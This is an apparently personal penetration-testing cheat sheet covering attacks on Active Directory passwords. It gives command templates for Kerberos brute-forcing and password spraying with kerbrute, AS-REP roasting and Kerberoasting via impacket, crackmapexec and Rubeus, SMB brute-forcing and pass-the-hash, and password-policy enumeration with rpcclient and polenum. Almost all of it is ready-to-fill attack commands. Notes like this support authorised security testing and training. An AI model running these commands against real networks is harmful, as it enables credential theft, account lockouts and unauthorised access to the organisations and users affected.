# Passwords & Policy
## Kerberos
Brute-forcing - WILL LOCKOUT USER
`kerbrute bruteuser --dc <IP> -d <DOMAIN> <PASSLIST> <USER>`
`kerbrute passwordspray --dc <IP> -d <DOMAIN> -v <USERLIST> <PASS>`

AS-REP Roasting:
`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/ -usersfile <USERLIST>` remote
`impacket-GetNPUsers -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` remote
`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --asreproast <OUTPUT>` remote
`Rubeus.exe asreproast /format:hashcat /nowrap` local

Kerberoasting:
`impacket-GetUserSPNs -dc-ip <IP> <DOMAIN>/<USER>:<PASS> -request` remote
`crackmapexec ldap <IP> --kdcHost <IP> -u <USER> -p <PASS> --kerberoasting <OUTPUT>` remote
`setspn -T medin -Q */*` local

## RPC
Password policy:
`rpcclient -U '<USER>%<PASS>' <IP> -c 'getdompwinfo'` (domain info)
`rpcclient -U '<USER>%<PASS>' <IP> -c 'getusrdompwinfo'` (user info)

## NetBIOS & SMB
Brute-forcing:
`crackmapexec smb <IP> -u <USER> -H <HASHES>`
`crackmapexec smb <IP> -u <USER> -p <PASSLIST>`

Password policy:
`polenum -u <USER> -p <PASS> -d <IP>`
`crackmapexec smb <IP> -u <USER> -p <PASS> --pass-pol`

Change users password:
`smbpasswd -U <USER> -r <IP>`